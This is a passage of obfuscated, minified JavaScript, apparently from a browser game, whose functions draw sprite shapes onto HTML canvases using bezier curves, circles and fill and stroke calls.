			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠⲆⲆ]);
			Ⲇᐃᐃ(Δ, ᐃ * 26, ᐃ * 70, 70 * ᐃ, ⲆΔⲆΔⵠ * ᐃ, ᐃ * 10);
			ΔⲆ(Δ, Ⲇᐃ[1]);
			Ⲇᐃᐃ(Δ, ᐃ * 5, ᐃ * 3, 22 * ᐃ, ᐃ * 94, ᐃ * 5);
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ΔΔⵠΔ], ᐃ * ⲆⵠᐃⲆ);
			Ⲇᐃᐃ(Δ, ᐃ * 40, ᐃ * ⵠⲆΔⵠΔ, 22 * ᐃ, 94 * ᐃ, ᐃ * ᐃᐃⲆᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃᐃⲆ], Ⲇᐃ[3], ᐃⲆᐃⲆⵠ * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * 75, ᐃ * ⵠⲆΔⵠΔ, 22 * ᐃ, ᐃ * 94, 5 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆᐃ], Ⲇᐃ[ΔᐃⲆΔ], ᐃ * 4);
			return Ⲇⵠ
		}

		function ⵠᐃᐃΔⵠΔᐃ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 137;
			Ⲇⵠ.height = 129 * ᐃ;
			Δ.globalAlpha = .5;
			ⵠᐃᐃ(Δ, ᐃ * 69, 64 * ᐃ, 48.16637831516918 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠⲆΔ]);
			Δ.globalAlpha = .7;
			ⵠᐃᐃ(Δ, ᐃ * 69, 64 * ᐃ, 38.23105625617661 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.globalAlpha = .7;
			ⵠᐃᐃ(Δ, ᐃ * 69, ᐃ * 64, ᐃ * 32.01562118716424);
			ΔⲆ(Δ, Ⲇᐃ[Δᐃⵠⵠ], Ⲇᐃ[3], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(72 * ᐃ, ᐃ * 41);
			Δ.bezierCurveTo(ᐃ * 52, ᐃ * 41, ᐃ * 48, ᐃ * 50, 45 * ᐃ, ᐃ * 58);
			Δ.bezierCurveTo(ᐃ * 43, ᐃ * 67, 45 * ᐃ, 68 * ᐃ, ᐃ * 46, ᐃ * 72);
			Δ.bezierCurveTo(52 * ᐃ, ᐃ * 53, ᐃ * 60, 48 * ᐃ, ᐃ * 72, ᐃ * 42);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(93 * ᐃ, 62 * ᐃ);
			Δ.bezierCurveTo(95 * ᐃ, ᐃ * 72, ᐃ * 90, ᐃ * 81, 81 * ᐃ, ᐃ * 87);
			Δ.bezierCurveTo(ᐃ * 74, ᐃ * 91, 69 * ᐃ, ᐃ * 89, 64 * ᐃ, 88 * ᐃ);
			Δ.bezierCurveTo(77 * ᐃ, ᐃ * 83, 84 * ᐃ, ᐃ * 82, ᐃ * 92, 62 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔᐃ]);
			return Ⲇⵠ
		}

		function ΔᐃⲆΔᐃⵠⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 372 * ᐃ;
			Ⲇⵠ.height = 358 * ᐃ;
			Δ.translate(ᐃ * ΔΔⵠ, 10 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .2 : ⵠΔᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 247.00003051757812, 115.76704406738281 * ᐃ);
			Δ.bezierCurveTo(305.0000305175781 * ᐃ, 124.76704406738281 * ᐃ, 335.0000305175781 * ᐃ, 112.76704406738281 * ᐃ, 359.0000305175781 * ᐃ, 93.76704406738281 * ᐃ);
			Δ.bezierCurveTo(359.5000305175781 * ᐃ, 113.26704406738281 * ᐃ, ᐃ * 359.5000305175781, ᐃ * 113.26704406738281, ᐃ * 360.0000305175781, ᐃ * 132.7670440673828);
			Δ.bezierCurveTo(339.0000305175781 * ᐃ, 177.7670440673828 * ᐃ, ᐃ * 281.0000305175781, ᐃ * 178.7670440673828, 243.00003051757812 * ᐃ, ᐃ * 183.7670440673828);
			Δ.bezierCurveTo(ᐃ * 214.50003051757812, 214.2670440673828 * ᐃ, ᐃ * 214.50003051757812, ᐃ * 214.2670440673828, 186.00003051757812 * ᐃ, ᐃ * 244.7670440673828);
			Δ.bezierCurveTo(155.00003051757812 * ᐃ, 214.2670440673828 * ᐃ, 155.00003051757812 * ᐃ, ᐃ * 214.2670440673828, ᐃ * 124.00003051757812, 183.7670440673828 * ᐃ);
			Δ.bezierCurveTo(51.000030517578125 * ᐃ, 180.7670440673828 * ᐃ, ᐃ * 21.000030517578125, ᐃ * 161.7670440673828, ᐃ * 9.000030517578125, 129.7670440673828 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 8.500030517578125, ᐃ * 110.76704406738281, ᐃ * 8.500030517578125, 110.76704406738281 * ᐃ, 8.000030517578125 * ᐃ, 91.76704406738281 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 31.000030517578125, ᐃ * 112.76704406738281, 87.00003051757812 * ᐃ, 119.76704406738281 * ᐃ, 116.00003051757812 * ᐃ, 117.76704406738281 * ᐃ);
			Δ.bezierCurveTo(175.00003051757812 * ᐃ, 18.767044067382812 * ᐃ, 170.00003051757812 * ᐃ, 23.767044067382812 * ᐃ, 181.00003051757812 * ᐃ, ᐃ * 14.767044067382812);
			Δ.bezierCurveTo(199.00003051757812 * ᐃ, ᐃ * 34.76704406738281, 203.00003051757812 * ᐃ, 54.76704406738281 * ᐃ, 247.00003051757812 * ᐃ, ᐃ * 115.76704406738281);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔⲆⵠⲆ], ᐃ * 10);
			Δ.translate(ᐃ * ⲆΔⵠ, ᐃ * -10);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(ᐃ * 107.00003051757812, 54.13069152832031 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 106.50003051757812, ᐃ * 38.63069152832031, ᐃ * 106.50003051757812, ᐃ * 38.63069152832031, 106.00003051757812 * ᐃ, ᐃ * 23.130691528320312);
			Δ.bezierCurveTo(ᐃ * 121.50003051757812, 38.13069152832031 * ᐃ, ᐃ * 121.50003051757812, 38.13069152832031 * ᐃ, ᐃ * 137.00003051757812, ᐃ * 53.13069152832031);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(233.00003051757812 * ᐃ, ᐃ * 53.6761474609375);
			Δ.bezierCurveTo(247.00003051757812 * ᐃ, 37.1761474609375 * ᐃ, 247.00003051757812 * ᐃ, ᐃ * 37.1761474609375, ᐃ * 261.0000305175781, ᐃ * 20.6761474609375);
			Δ.bezierCurveTo(ᐃ * 261.0000305175781, ᐃ * 36.1761474609375, 261.0000305175781 * ᐃ, ᐃ * 36.1761474609375, 261.0000305175781 * ᐃ, ᐃ * 51.6761474609375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ⵠⲆΔⵠΔ], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(293.0000305175781 * ᐃ, ᐃ * 54.403411865234375);
			Δ.bezierCurveTo(ᐃ * 300.0000305175781, ᐃ * 49.903411865234375, 300.0000305175781 * ᐃ, ᐃ * 49.903411865234375, 307.0000305175781 * ᐃ, 45.403411865234375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 307.0000305175781, 49.903411865234375 * ᐃ, ᐃ * 307.0000305175781, 49.903411865234375 * ᐃ, 307.0000305175781 * ᐃ, 54.403411865234375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ⵠⵠⵠⵠ], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(ᐃ * 77.00003051757812, 54.403411865234375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 70.00003051757812, ᐃ * 50.403411865234375, 70.00003051757812 * ᐃ, ᐃ * 50.403411865234375, 63.000030517578125 * ᐃ, ᐃ * 46.403411865234375);
			Δ.bezierCurveTo(62.500030517578125 * ᐃ, ᐃ * 50.903411865234375, ᐃ * 62.500030517578125, 50.903411865234375 * ᐃ, ᐃ * 62.000030517578125, ᐃ * 55.403411865234375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆΔⲆ], Ⲇᐃ[3], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(58.000030517578125 * ᐃ, ᐃ * 122.3125);
			Δ.bezierCurveTo(ᐃ * 59.500030517578125, ᐃ * 97.3125, ᐃ * 59.500030517578125, ᐃ * 97.3125, ᐃ * 61.000030517578125, 72.3125 * ᐃ);
			Δ.bezierCurveTo(91.00003051757812 * ᐃ, 89.3125 * ᐃ, 91.00003051757812 * ᐃ, ᐃ * 89.3125, ᐃ * 121.00003051757812, ᐃ * 106.3125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆⵠ], Ⲇᐃ[1], ⲆⲆⲆΔᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(310.0000305175781 * ᐃ, 127.3125 * ᐃ);
			Δ.bezierCurveTo(308.0000305175781 * ᐃ, 98.3125 * ᐃ, 308.0000305175781 * ᐃ, 98.3125 * ᐃ, ᐃ * 306.0000305175781, 69.3125 * ᐃ);
			Δ.bezierCurveTo(274.5000305175781 * ᐃ, 88.8125 * ᐃ, ᐃ * 274.5000305175781, ᐃ * 88.8125, 243.00003051757812 * ᐃ, ᐃ * 108.3125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔ], Ⲇᐃ[ΔᐃᐃⲆ], ᐃ * ΔᐃⲆⵠⵠΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(226.00003051757812 * ᐃ, ᐃ * 87.85795593261719);
			Δ.bezierCurveTo(ᐃ * 243.50003051757812, 66.85795593261719 * ᐃ, ᐃ * 243.50003051757812, 66.85795593261719 * ᐃ, 261.0000305175781 * ᐃ, ᐃ * 45.85795593261719);
			Δ.bezierCurveTo(ᐃ * 265.0000305175781, 83.85795593261719 * ᐃ, 265.0000305175781 * ᐃ, ᐃ * 83.85795593261719, 269.0000305175781 * ᐃ, 121.85795593261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 235.00003051757812, ᐃ * 122.85795593261719, ᐃ * 233.00003051757812, 107.85795593261719 * ᐃ, ᐃ * 228.00003051757812, 90.85795593261719 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 105.00003051757812, ᐃ * 128.8579559326172);
			Δ.bezierCurveTo(104.50003051757812 * ᐃ, 87.85795593261719 * ᐃ, ᐃ * 104.50003051757812, 87.85795593261719 * ᐃ, ᐃ * 104.00003051757812, 46.85795593261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 126.50003051757812, 69.35795593261719 * ᐃ, ᐃ * 126.50003051757812, ᐃ * 69.35795593261719, 149.00003051757812 * ᐃ, ᐃ * 91.85795593261719);
			Δ.bezierCurveTo(ᐃ * 130.00003051757812, ᐃ * 123.85795593261719, ᐃ * 123.00003051757812, 132.8579559326172 * ᐃ, 107.00003051757812 * ᐃ, 130.8579559326172 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃ], Ⲇᐃ[1], ᐃ * ⵠⲆⲆᐃⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(59.000030517578125 * ᐃ, 121.85795593261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 59.500030517578125, 99.35795593261719 * ᐃ, ᐃ * 59.500030517578125, 99.35795593261719 * ᐃ, 60.000030517578125 * ᐃ, ᐃ * 76.85795593261719);
			Δ.bezierCurveTo(ᐃ * 84.00003051757812, 92.35795593261719 * ᐃ, 84.00003051757812 * ᐃ, 92.35795593261719 * ᐃ, ᐃ * 108.00003051757812, ᐃ * 107.85795593261719);
			Δ.bezierCurveTo(106.00003051757812 * ᐃ, ᐃ * 148.8579559326172, 86.00003051757812 * ᐃ, 148.8579559326172 * ᐃ, 62.000030517578125 * ᐃ, 123.85795593261719 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ⲆΔⵠⵠ], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 105.00003051757812, ᐃ * 132.8579559326172);
			Δ.bezierCurveTo(104.50003051757812 * ᐃ, 93.35795593261719 * ᐃ, ᐃ * 104.50003051757812, ᐃ * 93.35795593261719, 104.00003051757812 * ᐃ, ᐃ * 53.85795593261719);
			Δ.bezierCurveTo(ᐃ * 126.50003051757812, 75.85795593261719 * ᐃ, ᐃ * 126.50003051757812, ᐃ * 75.85795593261719, ᐃ * 149.00003051757812, 97.85795593261719 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(311.0000305175781 * ᐃ, 126.85795593261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 309.0000305175781, 101.35795593261719 * ᐃ, 309.0000305175781 * ᐃ, ᐃ * 101.35795593261719, ᐃ * 307.0000305175781, 75.85795593261719 * ᐃ);
			Δ.bezierCurveTo(271.0000305175781 * ᐃ, ᐃ * 96.85795593261719, ᐃ * 271.0000305175781, ᐃ * 96.85795593261719, 235.00003051757812 * ᐃ, ᐃ * 117.85795593261719);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔᐃ], Ⲇᐃ[3], 10 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(228.00003051757812 * ᐃ, 96.85795593261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 244.50003051757812, ᐃ * 74.85795593261719, 244.50003051757812 * ᐃ, 74.85795593261719 * ᐃ, ᐃ * 261.0000305175781, 52.85795593261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 265.5000305175781, 89.85795593261719 * ᐃ, ᐃ * 265.5000305175781, 89.85795593261719 * ᐃ, 270.0000305175781 * ᐃ, 126.85795593261719 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠΔ], Ⲇᐃ[3], ᐃᐃⲆⵠⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(12.000030517578125 * ᐃ, ᐃ * 86.13069152832031);
			Δ.bezierCurveTo(ᐃ * 36.000030517578125, 113.13069152832031 * ᐃ, 84.00003051757812 * ᐃ, 111.13069152832031 * ᐃ, ᐃ * 116.00003051757812, 113.13069152832031 * ᐃ);
			Δ.bezierCurveTo(164.00003051757812 * ᐃ, 23.130691528320312 * ᐃ, ᐃ * 172.00003051757812, 18.130691528320312 * ᐃ, ᐃ * 181.00003051757812, 9.130691528320312 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 199.00003051757812, ᐃ * 29.130691528320312, 221.00003051757812 * ᐃ, 78.13069152832031 * ᐃ, ᐃ * 247.00003051757812, ᐃ * 112.13069152832031);
			Δ.bezierCurveTo(ᐃ * 301.0000305175781, 122.13069152832031 * ᐃ, 338.0000305175781 * ᐃ, ᐃ * 111.13069152832031, ᐃ * 359.0000305175781, ᐃ * 94.13069152832031);
			Δ.bezierCurveTo(359.0000305175781 * ᐃ, ᐃ * 113.13069152832031, 358.5000305175781 * ᐃ, 105.13069152832031 * ᐃ, ᐃ * 358.0000305175781, 116.13069152832031 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 270.5000305175781, ᐃ * 130.1306915283203, 270.5000305175781 * ᐃ, ᐃ * 130.1306915283203, 183.00003051757812 * ᐃ, 144.1306915283203 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 98.00003051757812, 128.6306915283203 * ᐃ, 98.00003051757812 * ᐃ, ᐃ * 128.6306915283203, 13.000030517578125 * ᐃ, 113.13069152832031 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠⲆⲆ], Ⲇᐃ[1], ᐃ * ΔⲆⵠⲆⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(247.00003051757812 * ᐃ, ᐃ * 115.76704406738281);
			Δ.bezierCurveTo(ᐃ * 305.0000305175781, ᐃ * 124.76704406738281, 335.0000305175781 * ᐃ, ᐃ * 112.76704406738281, 359.0000305175781 * ᐃ, ᐃ * 93.76704406738281);
			Δ.bezierCurveTo(ᐃ * 359.5000305175781, ᐃ * 113.26704406738281, 359.5000305175781 * ᐃ, ᐃ * 113.26704406738281, 360.0000305175781 * ᐃ, ᐃ * 132.7670440673828);
			Δ.bezierCurveTo(339.0000305175781 * ᐃ, ᐃ * 177.7670440673828, ᐃ * 281.0000305175781, 178.7670440673828 * ᐃ, ᐃ * 243.00003051757812, ᐃ * 183.7670440673828);
			Δ.bezierCurveTo(214.50003051757812 * ᐃ, 214.2670440673828 * ᐃ, 214.50003051757812 * ᐃ, ᐃ * 214.2670440673828, 186.00003051757812 * ᐃ, ᐃ * 244.7670440673828);
			Δ.bezierCurveTo(ᐃ * 155.00003051757812, ᐃ * 214.2670440673828, ᐃ * 155.00003051757812, 214.2670440673828 * ᐃ, ᐃ * 124.00003051757812, 183.7670440673828 * ᐃ);
			Δ.bezierCurveTo(51.000030517578125 * ᐃ, ᐃ * 180.7670440673828, ᐃ * 21.000030517578125, 161.7670440673828 * ᐃ, ᐃ * 9.000030517578125, ᐃ * 129.7670440673828);
			Δ.bezierCurveTo(ᐃ * 8.500030517578125, ᐃ * 110.76704406738281, 8.500030517578125 * ᐃ, ᐃ * 110.76704406738281, ᐃ * 8.000030517578125, 91.76704406738281 * ᐃ);
			Δ.bezierCurveTo(31.000030517578125 * ᐃ, 112.76704406738281 * ᐃ, ᐃ * 87.00003051757812, ᐃ * 119.76704406738281, ᐃ * 116.00003051757812, 117.76704406738281 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 175.00003051757812, ᐃ * 18.767044067382812, 170.00003051757812 * ᐃ, 23.767044067382812 * ᐃ, ᐃ * 181.00003051757812, ᐃ * 14.767044067382812);
			Δ.bezierCurveTo(199.00003051757812 * ᐃ, ᐃ * 34.76704406738281, ᐃ * 203.00003051757812, 54.76704406738281 * ᐃ, 247.00003051757812 * ᐃ, ᐃ * 115.76704406738281);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠᐃⲆ], Ⲇᐃ[3], 10 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(27.000030517578125 * ᐃ, 94.76704406738281 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 11.000030517578125, 81.76704406738281 * ᐃ, 31.000030517578125 * ᐃ, 72.76704406738281 * ᐃ, 44.000030517578125 * ᐃ, 59.76704406738281 * ᐃ);
			Δ.bezierCurveTo(9.000030517578125 * ᐃ, ᐃ * 65.76704406738281, 4.000030517578125 * ᐃ, 78.76704406738281 * ᐃ, ᐃ * 9.000030517578125, 89.76704406738281 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ᐃᐃⵠⲆᐃ], 10 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(352.0000305175781 * ᐃ, 100.76705932617188 * ᐃ);
			Δ.bezierCurveTo(362.0000305175781 * ᐃ, ᐃ * 92.76705932617188, 352.0000305175781 * ᐃ, ᐃ * 84.76705932617188, 340.0000305175781 * ᐃ, ᐃ * 68.76705932617188);
			Δ.bezierCurveTo(ᐃ * 360.0000305175781, ᐃ * 69.76705932617188, ᐃ * 364.0000305175781, ᐃ * 79.76705932617188, 364.0000305175781 * ᐃ, ᐃ * 94.76705932617188);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃ], Ⲇᐃ[1], 1 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(25.000030517578125 * ᐃ, 97.94886779785156 * ᐃ);
			Δ.bezierCurveTo(2.000030517578125 * ᐃ, 76.94886779785156 * ᐃ, ᐃ * 29.000030517578125, 62.94886779785156 * ᐃ, ᐃ * 44.000030517578125, ᐃ * 59.94886779785156);
			Δ.bezierCurveTo(8.000030517578125 * ᐃ, 59.94886779785156 * ᐃ, -.999969482421875 * ᐃ, ᐃ * 81.94886779785156, ᐃ * 4.000030517578125, ᐃ * 92.94886779785156);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 349.0000305175781, ᐃ * 100.94886779785156);
			Δ.bezierCurveTo(366.0000305175781 * ᐃ, 82.94886779785156 * ᐃ, ᐃ * 353.0000305175781, ᐃ * 76.94886779785156, ᐃ * 337.0000305175781, 67.94886779785156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 366.0000305175781, 69.94886779785156 * ᐃ, ᐃ * 366.0000305175781, ᐃ * 83.94886779785156, ᐃ * 363.0000305175781, 101.94886779785156 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔᐃ], Ⲇᐃ[3], 10 * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 46.000030517578125, ᐃ * 137.5852279663086, 9.219544457292887 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ᐃᐃⲆᐃ], ᐃ * ΔᐃⲆⵠ);
			ⵠᐃᐃ(Δ, 308.0000305175781 * ᐃ, ᐃ * 141.5852279663086, ᐃ * 8.54400374531753);
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], ᐃ * ΔᐃⲆⵠ);
			ⵠᐃᐃ(Δ, 92.00003051757812 * ᐃ, ᐃ * 149.58523559570312, ᐃ * 14.866068747318506);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⵠΔ], Ⲇᐃ[ⵠⵠᐃⵠ], ᐃ * Ⲇᐃⵠ);
			ⵠᐃᐃ(Δ, 262.0000305175781 * ᐃ, ᐃ * 148.8579559326172, ᐃ * 15.620499351813308);
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⵠⲆᐃᐃ], ᐃ * 1);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(184.00003051757812 * ᐃ, ᐃ * 68.85795593261719);
			Δ.bezierCurveTo(203.00003051757812 * ᐃ, ᐃ * 108.85795593261719, 203.00003051757812 * ᐃ, ᐃ * 108.85795593261719, ᐃ * 222.00003051757812, ᐃ * 148.8579559326172);
			Δ.bezierCurveTo(ᐃ * 202.50003051757812, 177.8579559326172 * ᐃ, 202.50003051757812 * ᐃ, 177.8579559326172 * ᐃ, 183.00003051757812 * ᐃ, 206.8579559326172 * ᐃ);
			Δ.bezierCurveTo(162.00003051757812 * ᐃ, 178.8579559326172 * ᐃ, ᐃ * 162.00003051757812, ᐃ * 178.8579559326172, ᐃ * 141.00003051757812, 150.8579559326172 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇⵠⵠⵠ], Ⲇᐃ[ᐃΔΔⲆ], 10 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(183.00003051757812 * ᐃ, ᐃ * 104.94886779785156);
			Δ.bezierCurveTo(192.50003051757812 * ᐃ, 125.44886779785156 * ᐃ, 192.50003051757812 * ᐃ, 125.44886779785156 * ᐃ, ᐃ * 202.00003051757812, ᐃ * 145.94886779785156);
			Δ.bezierCurveTo(ᐃ * 192.00003051757812, ᐃ * 163.94886779785156, ᐃ * 192.00003051757812, ᐃ * 163.94886779785156, ᐃ * 182.00003051757812, ᐃ * 181.94886779785156);
			Δ.bezierCurveTo(ᐃ * 172.50003051757812, 164.44886779785156 * ᐃ, 172.50003051757812 * ᐃ, ᐃ * 164.44886779785156, 163.00003051757812 * ᐃ, ᐃ * 146.94886779785156);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6]);
			return Ⲇⵠ
		}

		function ᐃΔᐃⲆΔΔⲆΔΔ(ᐃ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			if (0 == ⵠᐃ) {
				Ⲇⵠ.width = 543 * ᐃ;
				Ⲇⵠ.height = 393 * ᐃ;
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(196.23297119140625 * ᐃ, ᐃ * 77.8948974609375);
				Δ.bezierCurveTo(ᐃ * 276.23297119140625, 69.8948974609375 * ᐃ, ᐃ * 360.23297119140625, 87.8948974609375 * ᐃ, 431.23297119140625 * ᐃ, 121.8948974609375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 474.23297119140625, ᐃ * 146.8948974609375, ᐃ * 463.23297119140625, ᐃ * 184.8948974609375, 437.23297119140625 * ᐃ, ᐃ * 235.8948974609375);
				Δ.bezierCurveTo(413.23297119140625 * ᐃ, 277.8948974609375 * ᐃ, 383.23297119140625 * ᐃ, ᐃ * 289.8948974609375, ᐃ * 303.23297119140625, 289.8948974609375 * ᐃ);
				Δ.bezierCurveTo(178.23297119140625 * ᐃ, ᐃ * 292.8948974609375, ᐃ * 127.23297119140625, 301.8948974609375 * ᐃ, ᐃ * 92.23297119140625, ᐃ * 268.8948974609375);
				Δ.bezierCurveTo(ᐃ * 55.23297119140625, ᐃ * 234.8948974609375, 59.23297119140625 * ᐃ, 147.8948974609375 * ᐃ, ᐃ * 100.23297119140625, 112.8948974609375 * ᐃ);
				Δ.bezierCurveTo(133.23297119140625 * ᐃ, ᐃ * 83.8948974609375, ᐃ * 167.23297119140625, 82.8948974609375 * ᐃ, 196.23297119140625 * ᐃ, 77.8948974609375 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃⵠ])
			} else 1 == ⵠᐃ ? (Ⲇⵠ.width = 543 * ᐃ, Ⲇⵠ.height = 470 * ᐃ, Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[5], Δ.moveTo(ᐃ * 285.23297119140625, 51.803985595703125 * ᐃ), Δ.bezierCurveTo(ᐃ * 408.23297119140625, 57.803985595703125 * ᐃ, 463.23297119140625 * ᐃ, 107.80398559570312 * ᐃ, ᐃ * 480.23297119140625, ᐃ * 183.80398559570312), Δ.bezierCurveTo(ᐃ * 500.23297119140625, ᐃ * 282.8039855957031, 473.23297119140625 * ᐃ, 351.8039855957031 * ᐃ, 373.23297119140625 * ᐃ, ᐃ * 390.8039855957031), Δ.bezierCurveTo(ᐃ * 286.23297119140625, ᐃ * 420.8039855957031, 173.23297119140625 * ᐃ, ᐃ * 396.8039855957031, ᐃ * 86.23297119140625, 331.8039855957031 * ᐃ), 